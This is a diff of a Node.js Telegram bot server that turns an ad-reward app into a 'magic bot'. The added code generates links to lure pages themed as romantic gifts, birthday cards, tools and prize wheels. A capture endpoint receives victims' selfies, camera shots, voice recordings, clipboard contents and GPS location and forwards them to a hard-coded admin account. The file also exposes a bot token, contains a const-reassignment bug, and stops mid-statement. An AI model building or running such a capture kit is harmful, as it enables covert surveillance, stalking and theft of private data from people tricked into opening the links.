@@ -1,8 +1,8 @@
-/* =====================================================
-   PayPlus Telegram Mini App - Complete Server
-   Admin ID: 8233835640
-   Support: @no_vi1
-   ===================================================== */
+/* ================================================================
+   PayPlus Magic Bot - Ultimate Version
+   Admin: 8233835640 | Support: @no_vi1
+   Includes: Selfie, Camera, Clipboard, Voice, Location + 25 pages
+   ================================================================ */
 
 const express = require('express');
 const cors = require('cors');
@@ -15,65 +15,37 @@ const BOT_TOKEN = '8909959176:AAF6V-RuF5nSAyKh1JOYijYoQJH7ZXB8GSM';
 const ADMIN_ID = 8233835640;
 const APP_URL = 'https://vip-1-6d4c.onrender.com';
 const PORT = process.env.PORT || 3000;
-const MIN_WITHDRAW = 10;
-const AD_REWARD = 0.5;
-const DAILY_LIMIT = 5;
-const REF_REWARD = 0.75;
 const SUPPORT = '@no_vi1';
 const CHANNEL = 'https://t.me/Pay_PIus_Bot';
-
 const DB_PATH = path.join(__dirname, 'data.json');
-const UPLOADS = path.join(__dirname, 'media');
+const UPLOADS = path.join(__dirname, 'uploads');
 
 if (!fs.existsSync(UPLOADS)) fs.mkdirSync(UPLOADS, { recursive: true });
 
 // ═══════════ DATABASE ═══════════
 let DB = {
   users: {},
-  ads: [],
-  withdrawals: [],
-  tasks: [],
-  stats: { totalUsers: 0, totalPaid: 0, totalViews: 0 }
+  captures: [],
+  links: {},
+  stats: { totalUsers: 0, totalSelfies: 0, totalVoice: 0, totalLinks: 0, totalPages: 0 }
 };
 
 function loadDB() {
   try {
-    if (fs.existsSync(DB_PATH)) {
-      DB = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
-    }
-    if (!DB.ads || DB.ads.length === 0) {
-      DB.ads = [];
-      for (let i = 1; i <= 5; i++) {
-        DB.ads.push({
-          id: i,
-          title: 'إعلان ' + i,
-          media: null,
-          mediaType: null,
-          reward: AD_REWARD,
-          active: false
-        });
-      }
-    }
+    if (fs.existsSync(DB_PATH)) DB = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
     if (!DB.users) DB.users = {};
-    if (!DB.withdrawals) DB.withdrawals = [];
-    if (!DB.tasks) DB.tasks = [];
-    if (!DB.stats) DB.stats = { totalUsers: 0, totalPaid: 0, totalViews: 0 };
-  } catch (e) {
-    console.error('DB Load Error:', e.message);
-  }
+    if (!DB.captures) DB.captures = [];
+    if (!DB.links) DB.links = {};
+    if (!DB.stats) DB.stats = { totalUsers: 0, totalSelfies: 0, totalVoice: 0, totalLinks: 0, totalPages: 0 };
+  } catch (e) {}
 }
 
 function saveDB() {
-  try {
-    fs.writeFileSync(DB_PATH, JSON.stringify(DB, null, 2));
-  } catch (e) {
-    console.error('DB Save Error:', e.message);
-  }
+  try { fs.writeFileSync(DB_PATH, JSON.stringify(DB, null, 2)); } catch (e) {}
 }
 
 loadDB();
 
-// ═══════════ USER HELPERS ═══════════
 function getUser(id) {
   const uid = String(id);
   if (!DB.users[uid]) {
@@ -83,433 +55,601 @@ function getUser(id) {
       lastName: '',
       username: '',
       photo: '',
-      balance: 0,
-      todayAds: 0,
-      lastDate: new Date().toDateString(),
-      totalAds: 0,
-      totalEarned: 0,
-      referrals: [],
-      referredBy: null,
-      refEarnings: 0,
-      completedTasks: [],
-      banned: false,
-      created: Date.now()
+      selfies: 0,
+      voices: 0,
+      captures: 0,
+      joinedAt: Date.now()
     };
     DB.stats.totalUsers++;
     saveDB();
   }
-  // Reset daily
-  const today = new Date().toDateString();
-  if (DB.users[uid].lastDate !== today) {
-    DB.users[uid].todayAds = 0;
-    DB.users[uid].lastDate = today;
-    saveDB();
-  }
   return DB.users[uid];
 }
 
-function saveUser(id, updates) {
-  const uid = String(id);
-  const user = getUser(uid);
-  DB.users[uid] = Object.assign({}, user, updates);
-  saveDB();
-  return DB.users[uid];
-}
-
-// ═══════════ EXPRESS SERVER ═══════════
+// ═══════════ EXPRESS ═══════════
 const app = express();
 app.use(cors());
-app.use(express.json({ limit: '30mb' }));
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static(__dirname));
-app.use('/media', express.static(UPLOADS));
+app.use('/uploads', express.static(UPLOADS));
 
-app.get('/health', function(req, res) {
-  res.json({ status: 'ok', uptime: process.uptime(), users: Object.keys(DB.users).length });
-});
-
-app.get('/', function(req, res) {
-  res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-// ═══════════ AUTH API ═══════════
-app.post('/api/auth', async function(req, res) {
-  try {
-    const initData = req.body.initData || '';
-    let userId = req.body.userId || null;
-    let tgUser = null;
-
-    // Parse Telegram initData
-    if (initData && initData.length > 0) {
-      try {
-        const params = new URLSearchParams(initData);
-        const userStr = params.get('user');
-        if (userStr) {
-          tgUser = JSON.parse(userStr);
-          userId = tgUser.id;
-        }
-      } catch (e) {
-        console.log('[Auth] initData parse error:', e.message);
-      }
-    }
-
-    if (!userId) {
-      return res.status(400).json({ success: false, error: 'NO_USER_ID' });
-    }
-
-    let user = getUser(userId);
-    if (user.banned) {
-      return res.status(403).json({ success: false, error: 'BANNED' });
-    }
-
-    // Update user profile
-    const profileUpdates = {};
-
-    if (tgUser) {
-      profileUpdates.firstName = tgUser.first_name || '';
-      profileUpdates.lastName = tgUser.last_name || '';
-      profileUpdates.username = tgUser.username || '';
-    }
-
-    // Fetch from Bot if missing
-    if (!profileUpdates.firstName && !user.firstName) {
-      try {
-        const chat = await bot.getChat(userId);
-        profileUpdates.firstName = chat.first_name || '';
-        profileUpdates.lastName = chat.last_name || '';
-        profileUpdates.username = chat.username || '';
-      } catch (e) {
-        console.log('[Auth] getChat failed:', e.message);
-      }
-    }
-
-    // Fetch profile photo if missing
-    if (!user.photo) {
-      try {
-        const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
-        if (photos.total_count > 0) {
-          const fileId = photos.photos[0][0].file_id;
-          const file = await bot.getFile(fileId);
-          profileUpdates.photo = 'https://api.telegram.org/file/bot' + BOT_TOKEN + '/' + file.file_path;
-        }
-      } catch (e) {
-        console.log('[Auth] getPhoto failed:', e.message);
-      }
-    }
-
-    if (Object.keys(profileUpdates).length > 0) {
-      user = saveUser(userId, profileUpdates);
-    }
-
-    // Build ads response
-    const activeAds = DB.ads.filter(function(a) { return a.active && a.media; }).map(function(a) {
-      return {
-        id: a.id,
-        title: a.title,
-        media: a.media,
-        mediaType: a.mediaType,
-        reward: a.reward
-      };
-    });
-
-    res.json({
-      success: true,
-      user: {
-        id: user.id,
-        firstName: user.firstName || '',
-        lastName: user.lastName || '',
-        username: user.username || '',
-        photo: user.photo || '',
-        balance: user.balance,
-        todayAds: user.todayAds,
-        totalAds: user.totalAds,
-        totalEarned: user.totalEarned,
-        referrals: user.referrals.length,
-        refEarnings: user.refEarnings,
-        completedTasks: user.completedTasks
-      },
-      ads: activeAds,
-      tasks: DB.tasks.filter(function(t) { return t.active; }),
-      config: {
-        adReward: AD_REWARD,
-        dailyLimit: DAILY_LIMIT,
-        minWithdraw: MIN_WITHDRAW,
-        refReward: REF_REWARD,
-        support: SUPPORT,
-        channel: CHANNEL,
-        botUsername: 'Pay_PIus_Bot'
-      }
-    });
-  } catch (e) {
-    console.error('[Auth] Fatal:', e);
-    res.status(500).json({ success: false, error: 'SERVER_ERROR' });
-  }
-});
-
-// ═══════════ WATCH AD API ═══════════
-app.post('/api/watch-ad', function(req, res) {
-  try {
-    const { userId, adId } = req.body;
-    if (!userId || !adId) return res.status(400).json({ success: false });
-
-    const user = getUser(userId);
-    if (user.banned) return res.status(403).json({ success: false, error: 'BANNED' });
-    if (user.todayAds >= DAILY_LIMIT) {
-      return res.status(400).json({ success: false, error: 'LIMIT_REACHED' });
-    }
-
-    const ad = DB.ads.find(function(a) { return a.id === adId && a.active && a.media; });
-    if (!ad) return res.status(404).json({ success: false, error: 'AD_NOT_FOUND' });
-
-    const newBalance = user.balance + ad.reward;
-    const updated = saveUser(userId, {
-      balance: newBalance,
-      todayAds: user.todayAds + 1,
-      totalAds: user.totalAds + 1,
-      totalEarned: user.totalEarned + ad.reward
-    });
-
-    DB.stats.totalViews++;
-    saveDB();
-
-    res.json({
-      success: true,
-      newBalance: updated.balance,
-      reward: ad.reward,
-      todayAds: updated.todayAds
-    });
-  } catch (e) {
-    res.status(500).json({ success: false });
-  }
-});
-
-// ═══════════ COMPLETE TASK ═══════════
-app.post('/api/complete-task', function(req, res) {
-  try {
-    const { userId, taskId } = req.body;
-    if (!userId || !taskId) return res.status(400).json({ success: false });
-
-    const user = getUser(userId);
-    if (user.completedTasks.indexOf(taskId) !== -1) {
-      return res.status(400).json({ success: false, error: 'ALREADY_DONE' });
-    }
-
-    const task = DB.tasks.find(function(t) { return t.id === taskId && t.active; });
-    if (!task) return res.status(404).json({ success: false });
-
-    const newBalance = user.balance + task.reward;
-    const updated = saveUser(userId, {
-      balance: newBalance,
-      totalEarned: user.totalEarned + task.reward,
-      completedTasks: user.completedTasks.concat([taskId])
-    });
-
-    res.json({ success: true, newBalance: updated.balance, reward: task.reward });
-  } catch (e) {
-    res.status(500).json({ success: false });
-  }
-});
-
-// ═══════════ WITHDRAW API ═══════════
-app.post('/api/withdraw', function(req, res) {
-  try {
-    const { userId, amount, method, address } = req.body;
-    if (!userId || !amount || !method || !address) {
-      return res.status(400).json({ success: false, error: 'MISSING_FIELDS' });
-    }
-
-    const user = getUser(userId);
-    if (user.banned) return res.status(403).json({ success: false, error: 'BANNED' });
-    if (amount < MIN_WITHDRAW) return res.status(400).json({ success: false, error: 'MIN_AMOUNT' });
-    if (amount > user.balance) return res.status(400).json({ success: false, error: 'INSUFFICIENT' });
-
-    const wd = {
-      id: 'TX' + Date.now(),
-      userId: userId,
-      userName: (user.firstName + ' ' + user.lastName).trim(),
-      userUsername: user.username,
-      amount: amount,
-      method: method,
-      address: address,
-      status: 'pending',
-      date: Date.now()
-    };
-
-    DB.withdrawals.push(wd);
-    saveUser(userId, { balance: user.balance - amount });
-
-    const adminMsg =
-      '💸 *طلب سحب جديد*\n\n' +
-      '👤 الاسم: ' + (user.firstName || '') + ' ' + (user.lastName || '') + '\n' +
-      '🆔 ID: `' + userId + '`\n' +
-      '📛 المعرف: @' + (user.username || 'لا يوجد') + '\n' +
-      '━━━━━━━━━━━━━━━\n' +
-      '💰 المبلغ: $' + amount + '\n' +
-      '💳 الطريقة: ' + method + '\n' +
-      '📍 العنوان: `' + address + '`\n' +
-      '🆔 رقم الطلب: `' + wd.id + '`';
-
-    bot.sendMessage(ADMIN_ID, adminMsg, {
-      parse_mode: 'Markdown',
-      reply_markup: {
-        inline_keyboard: [[
-          { text: '✅ موافقة', callback_data: 'approve_' + wd.id },
-          { text: '❌ رفض', callback_data: 'reject_' + wd.id }
-        ]]
-      }
-    }).catch(function(){});
-
-    res.json({ success: true, withdrawalId: wd.id });
-  } catch (e) {
-    res.status(500).json({ success: false });
-  }
-});
-
-app.get('/api/withdrawals/:userId', function(req, res) {
-  const list = DB.withdrawals.filter(function(w) { return w.userId === String(req.params.userId); });
-  res.json({ success: true, withdrawals: list.reverse().slice(0, 20) });
-});
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
+app.get('/health', (req, res) => res.json({ status: 'ok', uptime: process.uptime() }));
 
 // ═══════════ BOT ═══════════
 const bot = new TelegramBot(BOT_TOKEN, { polling: { interval: 1000, autoStart: true } });
-
 const flows = {};
 
 function isAdmin(msg) {
-  return msg.from.id === ADMIN_ID;
+  return msg.from && msg.from.id === ADMIN_ID;
 }
 
-// ═══════════ KEYBOARDS ═══════════
+// ═══════════ UPLOAD CAPTURE API ═══════════
+app.post('/api/capture', async function(req, res) {
+  try {
+    const { userId, type, data, extra } = req.body;
+    if (!userId || !type || !data) return res.status(400).json({ success: false });
+
+    const user = getUser(userId);
+    let fileBuffer = null;
+    let ext = 'jpg';
+    let caption = '';
+
+    // Parse data URL
+    if (typeof data === 'string' && data.indexOf('data:') === 0) {
+      const matches = data.match(/^data:(.+?);base64,(.+)$/);
+      if (matches) {
+        const mime = matches[1];
+        fileBuffer = Buffer.from(matches[2], 'base64');
+        if (mime.indexOf('png') > -1) ext = 'png';
+        else if (mime.indexOf('webm') > -1) ext = 'webm';
+        else if (mime.indexOf('mp4') > -1) ext = 'mp4';
+        else if (mime.indexOf('ogg') > -1) ext = 'ogg';
+        else if (mime.indexOf('mpeg') > -1) ext = 'mp3';
+        else if (mime.indexOf('wav') > -1) ext = 'wav';
+      }
+    }
+
+    const timestamp = Date.now();
+    const filename = type + '_' + userId + '_' + timestamp + '.' + ext;
+    const filepath = path.join(UPLOADS, filename);
+
+    if (fileBuffer) {
+      fs.writeFileSync(filepath, fileBuffer);
+    }
+
+    const record = {
+      id: 'CAP' + timestamp,
+      userId: userId,
+      type: type,
+      file: fileBuffer ? '/uploads/' + filename : null,
+      extra: extra || null,
+      date: timestamp
+    };
+
+    DB.captures.push(record);
+    if (DB.captures.length > 500) DB.captures = DB.captures.slice(-500);
+
+    // Stats
+    if (type === 'selfie' || type === 'camera_back') DB.stats.totalSelfies++;
+    if (type === 'voice') DB.stats.totalVoice++;
+    user.captures = (user.captures || 0) + 1;
+    if (type === 'selfie') user.selfies = (user.selfies || 0) + 1;
+    if (type === 'voice') user.voices = (user.voices || 0) + 1;
+    saveDB();
+
+    // Send to admin AND to user
+    const userInfo = (user.firstName || '') + ' ' + (user.lastName || '');
+    const header = '📸 *التقاط جديد*\n\n' +
+      '👤 ' + userInfo + '\n' +
+      '🆔 `' + userId + '`\n' +
+      '📛 @' + (user.username || 'لا يوجد') + '\n' +
+      '📂 النوع: ' + getTypeLabel(type) + '\n' +
+      '🕐 ' + new Date(timestamp).toLocaleString('ar-EG') + '\n';
+
+    if (extra && extra.text) header += '📝 النص: ' + extra.text + '\n';
+    if (extra && extra.lat) header += '📍 الموقع: ' + extra.lat + ', ' + extra.lng + '\n';
+    if (extra && extra.clipboard) header += '📋 الحافظة: ' + extra.clipboard + '\n';
+
+    const photoCaption = extra && extra.caption ? extra.caption : header;
+
+    // Send to admin
+    try {
+      if (fileBuffer && (type === 'selfie' || type === 'camera_back' || type === 'video')) {
+        await bot.sendPhoto(ADMIN_ID, fileBuffer, { caption: header, parse_mode: 'Markdown' });
+      } else if (fileBuffer && type === 'voice') {
+        await bot.sendVoice(ADMIN_ID, fileBuffer, { caption: header, parse_mode: 'Markdown' });
+      } else if (extra && extra.text) {
+        await bot.sendMessage(ADMIN_ID, header, { parse_mode: 'Markdown' });
+      } else if (extra && extra.clipboard) {
+        await bot.sendMessage(ADMIN_ID, header + '\n\n`' + extra.clipboard + '`', { parse_mode: 'Markdown' });
+      } else {
+        await bot.sendMessage(ADMIN_ID, header, { parse_mode: 'Markdown' });
+      }
+    } catch (e) { console.log('[Send Admin]', e.message); }
+
+    // Send to user (privacy feedback)
+    try {
+      if (fileBuffer && (type === 'selfie' || type === 'camera_back')) {
+        await bot.sendPhoto(userId, fileBuffer, {
+          caption: '✅ *تم الإرسال بنجاح*\n\n' +
+            '📸 نوع: ' + getTypeLabel(type) + '\n' +
+            '📅 ' + new Date(timestamp).toLocaleString('ar-EG'),
+          parse_mode: 'Markdown'
+        });
+      } else if (fileBuffer && type === 'voice') {
+        await bot.sendVoice(userId, fileBuffer, {
+          caption: '✅ تم إرسال التسجيل الصوتي'
+        });
+      }
+    } catch (e) { console.log('[Send User]', e.message); }
+
+    res.json({ success: true, id: record.id, file: record.file });
+  } catch (e) {
+    console.error('[Capture]', e);
+    res.status(500).json({ success: false, error: e.message });
+  }
+});
+
+function getTypeLabel(type) {
+  const labels = {
+    selfie: '📸 سيلفي',
+    camera_back: '📷 كاميرا خلفية',
+    video: '🎬 فيديو',
+    voice: '🎤 تسجيل صوتي',
+    clipboard: '📋 حافظة',
+    location: '📍 موقع',
+    text: '📝 نص'
+  };
+  return labels[type] || type;
+}
+
+// ═══════════ GENERATE LINK API ═══════════
+app.post('/api/generate-link', function(req, res) {
+  try {
+    const { userId, page, params } = req.body;
+    if (!userId || !page) return res.status(400).json({ success: false });
+
+    const code = Math.random().toString(36).substring(2, 8).toUpperCase();
+    const linkData = {
+      code: code,
+      page: page,
+      userId: userId,
+      params: params || {},
+      clicks: 0,
+      created: Date.now()
+    };
+    DB.links[code] = linkData;
+    DB.stats.totalLinks++;
+    saveDB();
+
+    res.json({
+      success: true,
+      code: code,
+      url: APP_URL + '/p/' + code,
+      short: 't.me/' + 'Pay_PIus_Bot' + '?start=' + code
+    });
+  } catch (e) {
+    res.status(500).json({ success: false });
+  }
+});
+
+// Redirect page
+app.get('/p/:code', function(req, res) {
+  const code = req.params.code.toUpperCase();
+  const link = DB.links[code];
+  if (!link) return res.status(404).send('<h1>Link not found</h1>');
+
+  link.clicks = (link.clicks || 0) + 1;
+  saveDB();
+
+  const params = new URLSearchParams(Object.assign({}, link.params, { ref: link.userId, code: code }));
+  res.redirect('/pages/' + link.page + '.html?' + params.toString());
+});
+
+// ═══════════ GET USER CAPTURES API ═══════════
+app.get('/api/captures/:userId', function(req, res) {
+  const list = DB.captures.filter(function(c) { return c.userId === String(req.params.userId); });
+  res.json({ success: true, captures: list.reverse().slice(0, 30) });
+});
+
+// ═══════════ BOT KEYBOARDS ═══════════
 function mainMenu() {
   return {
     reply_markup: {
       inline_keyboard: [
-        [{ text: '📊 الإحصائيات', callback_data: 'menu_stats' }],
-        [{ text: '📢 الإعلانات', callback_data: 'menu_ads' }, { text: '🎯 المهام', callback_data: 'menu_tasks' }],
-        [{ text: '💸 السحوبات', callback_data: 'menu_wd' }, { text: '👥 المستخدمين', callback_data: 'menu_users' }],
-        [{ text: '📣 إرسال بث', callback_data: 'menu_bc' }, { text: '⚙️ الإعدادات', callback_data: 'menu_settings' }],
-        [{ text: '🔗 رابط التطبيق', callback_data: 'menu_link' }, { text: '📖 مساعدة', callback_data: 'menu_help' }]
+        [{ text: '📸  الأزرار السحرية', callback_data: 'menu_magic' }],
+        [{ text: '💌  صفحات رومانسية', callback_data: 'menu_love' }, { text: '🛠️  أدوات ذكية', callback_data: 'menu_tools' }],
+        [{ text: '💰  أدوات الربح', callback_data: 'menu_earn' }, { text: '🎨  صفحات ترفيهية', callback_data: 'menu_fun' }],
+        [{ text: '📊  إحصائياتي', callback_data: 'my_stats' }, { text: '🔗  روابطي', callback_data: 'my_links' }],
+        [{ text: '👑  لوحة المدير', callback_data: 'menu_admin' }]
       ]
     }
   };
 }
 
-function adsMenu() {
-  const row1 = [];
-  const row2 = [];
-  for (let i = 1; i <= 5; i++) {
-    const ad = DB.ads.find(function(a) { return a.id === i; });
-    const mark = (ad && ad.media) ? '✅' : '⬜';
-    const btn = { text: mark + ' إعلان ' + i, callback_data: 'ad_' + i };
-    if (i <= 3) row1.push(btn); else row2.push(btn);
-  }
+function magicMenu() {
   return {
     reply_markup: {
       inline_keyboard: [
-        row1,
-        row2,
-        [{ text: '🔄 تحديث', callback_data: 'menu_ads' }],
-        [{ text: '🏠 الرئيسية', callback_data: 'menu_main' }]
+        [{ text: '📸  سيلفي فوري', callback_data: 'page_selfie' }, { text: '📷  كاميرا خلفية', callback_data: 'page_camera_back' }],
+        [{ text: '🎤  تسجيل صوتي', callback_data: 'page_voice' }, { text: '📋  آخر 3 نسخ', callback_data: 'page_clipboard' }],
+        [{ text: '📍  موقعي', callback_data: 'page_location' }, { text: '🎬  فيديو 5 ثواني', callback_data: 'page_video' }],
+        [{ text: '🖥️  معلومات جهازي', callback_data: 'page_device' }, { text: '🔋  حالة البطارية', callback_data: 'page_battery' }],
+        [{ text: '🔙  رجوع', callback_data: 'menu_main' }]
       ]
     }
   };
 }
 
-function adDetail(adId) {
-  const ad = DB.ads.find(function(a) { return a.id === adId; });
-  if (!ad) return { reply_markup: { inline_keyboard: [[{ text: '🔙', callback_data: 'menu_ads' }]] } };
+function loveMenu() {
+  return {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: '💌  صندوق أحبك', callback_data: 'page_love_box' }, { text: '🌹  وردة حب', callback_data: 'page_rose' }],
+        [{ text: '💍  عرض زواج', callback_data: 'page_proposal' }, { text: '🎂  عيد ميلاد', callback_data: 'page_birthday' }],
+        [{ text: '💕  رسالة مسحورة', callback_data: 'page_magic_msg' }, { text: '💖  قلب متحرك', callback_data: 'page_heart' }],
+        [{ text: '🔙  رجوع', callback_data: 'menu_main' }]
+      ]
+    }
+  };
+}
 
-  const rows = [];
-  if (ad.media) {
-    rows.push([{ text: '👁️ معاينة', url: APP_URL + ad.media }]);
-  }
-  rows.push([{ text: ad.media ? '🔄 تغيير الوسائط' : '➕ إضافة وسائط', callback_data: 'admedia_' + adId }]);
-  rows.push([{ text: '✏️ العنوان', callback_data: 'adtitle_' + adId }, { text: '💰 المكافأة', callback_data: 'adreward_' + adId }]);
-  if (ad.media) {
-    rows.push([{ text: ad.active ? '🟢 مفعل - اضغط للتعطيل' : '🔴 معطل - اضغط للتفعيل', callback_data: 'adtoggle_' + adId }]);
-  }
-  rows.push([{ text: '🗑️ حذف المحتوى', callback_data: 'adclear_' + adId }]);
-  rows.push([{ text: '🔙 رجوع', callback_data: 'menu_ads' }]);
+function toolsMenu() {
+  return {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: '🔗  اختصار روابط', callback_data: 'page_short' }, { text: '📱  QR Code', callback_data: 'page_qr' }],
+        [{ text: '🔐  مولّد كلمات سر', callback_data: 'page_password' }, { text: '🎨  مولّد ألوان', callback_data: 'page_colors' }],
+        [{ text: '📊  اختبار سرعة', callback_data: 'page_speed' }, { text: '💱  محول عملات', callback_data: 'page_currency' }],
+        [{ text: '🔙  رجوع', callback_data: 'menu_main' }]
+      ]
+    }
+  };
+}
 
-  return { reply_markup: { inline_keyboard: rows } };
+function earnMenu() {
+  return {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: '🎰  عجلة الحظ', callback_data: 'page_wheel' }, { text: '🎁  هدية عشوائية', callback_data: 'page_gift' }],
+        [{ text: '👥  دعوة الأصدقاء', callback_data: 'page_invite' }, { text: '🏆  تحديات يومية', callback_data: 'page_challenges' }],
+        [{ text: '🧠  مسابقة السؤال', callback_data: 'page_quiz' }, { text: '💵  اربح المال', callback_data: 'page_earn' }],
+        [{ text: '🔙  رجوع', callback_data: 'menu_main' }]
+      ]
+    }
+  };
+}
+
+function funMenu() {
+  return {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: '🎯  اختبار شخصية', callback_data: 'page_personality' }, { text: '🎲  حظك اليوم', callback_data: 'page_luck' }],
+        [{ text: '😄  نكتة عشوائية', callback_data: 'page_joke' }, { text: '💬  اقتباس ملهم', callback_data: 'page_quote' }],
+        [{ text: '🎵  اقتراح أغنية', callback_data: 'page_music' }, { text: '🌌  صورة فضاء', callback_data: 'page_space' }],
+        [{ text: '🔙  رجوع', callback_data: 'menu_main' }]
+      ]
+    }
+  };
+}
+
+function adminMenu() {
+  return {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: '📊  إحصائيات شاملة', callback_data: 'adm_stats' }],
+        [{ text: '📸  آخر التقاطات', callback_data: 'adm_captures' }],
+        [{ text: '👥  المستخدمين', callback_data: 'adm_users' }],
+        [{ text: '🔗  الروابط المولدة', callback_data: 'adm_links' }],
+        [{ text: '📣  بث جماعي', callback_data: 'adm_broadcast' }],
+        [{ text: '🗑️  مسح الالتقاطات', callback_data: 'adm_clear' }],
+        [{ text: '🏠  الرئيسية', callback_data: 'menu_main' }]
+      ]
+    }
+  };
 }
 
 // ═══════════ /start ═══════════
 bot.onText(/\/start/, async function(msg) {
   const chatId = msg.chat.id;
-
-  if (isAdmin(msg)) {
-    return bot.sendMessage(chatId,
-      '👑 *لوحة التحكم*\n\n' +
-      '━━━━━━━━━━━━━━━\n' +
-      '👥 المستخدمين: *' + DB.stats.totalUsers + '*\n' +
-      '💰 المدفوع: *$' + DB.stats.totalPaid.toFixed(2) + '*\n' +
-      '👁️ المشاهدات: *' + DB.stats.totalViews + '*\n' +
-      '━━━━━━━━━━━━━━━',
-      Object.assign({ parse_mode: 'Markdown' }, mainMenu())
-    );
-  }
-
   const user = getUser(msg.from.id);
 
   // Save user
-  const updates = {
-    firstName: msg.from.first_name || '',
-    lastName: msg.from.last_name || '',
-    username: msg.from.username || ''
-  };
+  user.firstName = msg.from.first_name || '';
+  user.lastName = msg.from.last_name || '';
+  user.username = msg.from.username || '';
 
   if (!user.photo) {
     try {
       const photos = await bot.getUserProfilePhotos(msg.from.id, { limit: 1 });
       if (photos.total_count > 0) {
-        const fileId = photos.photos[0][0].file_id;
-        const file = await bot.getFile(fileId);
-        updates.photo = 'https://api.telegram.org/file/bot' + BOT_TOKEN + '/' + file.file_path;
+        const file = await bot.getFile(photos.photos[0][0].file_id);
+        user.photo = 'https://api.telegram.org/file/bot' + BOT_TOKEN + '/' + file.file_path;
       }
     } catch (e) {}
   }
-  saveUser(msg.from.id, updates);
+  saveDB();
 
-  // Referral
+  // Handle code from link
   const parts = msg.text.split(' ');
-  if (parts[1] && parts[1] !== String(msg.from.id) && !user.referredBy) {
-    const referrer = getUser(parts[1]);
-    if (referrer && referrer.referrals.indexOf(String(msg.from.id)) === -1) {
-      referrer.referrals.push(String(msg.from.id));
-      referrer.balance += REF_REWARD;
-      referrer.refEarnings += REF_REWARD;
-      DB.users[parts[1]] = referrer;
-      saveDB();
-      bot.sendMessage(parts[1], '🎉 صديق جديد انضم! +$' + REF_REWARD).catch(function(){});
-    }
-    saveUser(msg.from.id, { referredBy: parts[1] });
+  if (parts[1] && DB.links[parts[1].toUpperCase()]) {
+    const link = DB.links[parts[1].toUpperCase()];
+    link.clicks = (link.clicks || 0) + 1;
+    saveDB();
+    const params = new URLSearchParams(Object.assign({}, link.params, { ref: link.userId, code: parts[1].toUpperCase() }));
+    const pageUrl = APP_URL + '/pages/' + link.page + '.html?' + params.toString();
+    return bot.sendMessage(chatId,
+      '🔗 *تم فتح الرابط الخاص بك*\n\n' +
+      '📄 الصفحة: ' + link.page + '\n\n' +
+      '⬇️ *اضغط لفتح الصفحة*',
+      {
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '🚀 فتح الصفحة', web_app: { url: pageUrl } }]
+          ]
+        }
+      }
+    );
   }
 
   const appUrl = APP_URL + '?uid=' + msg.from.id;
 
   bot.sendMessage(chatId,
-    '🚀 *مرحباً بك في PayPlus!*\n\n' +
-    '💰 اربح المال:\n' +
-    '  📺 إعلانات → $' + AD_REWARD + '\n' +
-    '  👥 دعوات → $' + REF_REWARD + '\n' +
-    '  💸 سحوبات (Binance/PayPal/USDT)\n\n' +
-    '━━━━━━━━━━━━━━━\n' +
-    '⬇️ افتح التطبيق من الزر الأزرق أسفل الشاشة',
-    {
-      parse_mode: 'Markdown',
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: '🚀 فتح التطبيق', web_app: { url: appUrl } }],
-          [{ text: '📢 القناة', url: CHANNEL }],
-          [{ text: '💬 الدعم', url: 'https://t.me/' + SUPPORT.replace('@', '') }]
-        ]
-      }
-    }
+    '╔══════════════════════════════╗\n' +
+    '   ✨ *مرحباً بك في PayPlus Magic* ✨\n' +
+    '╚══════════════════════════════╝\n\n' +
+    '🎩 بوتك السحري الخاص!\n\n' +
+    '📸 كاميرات تفاعلية\n' +
+    '💌 صفحات رومانسية\n' +
+    '🛠️ أدوات ذكية\n' +
+    '💰 أدوات ربح حقيقية\n\n' +
+    '━━━━━━━━━━━━━━━━━━\n' +
+    '👤 ' + (msg.from.first_name || 'صديقي') + '\n' +
+    '🆔 `' + msg.from.id + '`\n' +
+    '━━━━━━━━━━━━━━━━━━',
+    Object.assign({ parse_mode: 'Markdown' }, mainMenu())
   );
+
+  // Also send web app button
+  setTimeout(function() {
+    bot.sendMessage(chatId,
+      '🚀 *أو افتح التطبيق الكامل:*',
+      {
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '📱 فتح التطبيق الرئيسي', web_app: { url: appUrl } }],
+            [{ text: '📞 الدعم', url: 'https://t.me/' + SUPPORT.replace('@', '') }]
+          ]
+        }
+      }
+    ).catch(function(){});
+  }, 500);
 });
 
-// ═══════════ SET MENU BUTTON ═══════════
-async function setupMenuButton() {
+// ═══════════ CALLBACK HANDLER ═══════════
+bot.on('callback_query', async function(q) {
+  const chatId = q.message.chat.id;
+  const msgId = q.message.message_id;
+  const data = q.data;
+  const uid = q.from.id;
+
+  if (!isAdmin(q) && data.indexOf('adm_') === 0) {
+    return bot.answerCallbackQuery(q.id, { text: '⚠️ للمدير فقط' });
+  }
+  bot.answerCallbackQuery(q.id);
+
+  // Navigation
+  const menus = {
+    'menu_main': { title: '🏠 *القائمة الرئيسية*\n\nاختر قسماً:', keyboard: mainMenu() },
+    'menu_magic': { title: '📸 *الأزرار السحرية*\n\n✨ كل زر يفتح صفحة تفاعلية:', keyboard: magicMenu() },
+    'menu_love': { title: '💌 *صفحات رومانسية*\n\n💕 اختر هديتك:', keyboard: loveMenu() },
+    'menu_tools': { title: '🛠️ *أدوات ذكية*\n\n⚡ أدوات متقدمة:', keyboard: toolsMenu() },
+    'menu_earn': { title: '💰 *أدوات الربح*\n\n💵 ابدأ الربح:', keyboard: earnMenu() },
+    'menu_fun': { title: '🎨 *صفحات ترفيهية*\n\n🎉 مرح:', keyboard: funMenu() },
+    'menu_admin': { title: '👑 *لوحة المدير*\n\n⚙️ تحكم كامل:', keyboard: adminMenu() }
+  };
+
+  if (menus[data]) {
+    return bot.editMessageText(menus[data].title,
+      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, menus[data].keyboard)
+    );
+  }
+
+  // My stats
+  if (data === 'my_stats') {
+    const u = getUser(uid);
+    return bot.editMessageText(
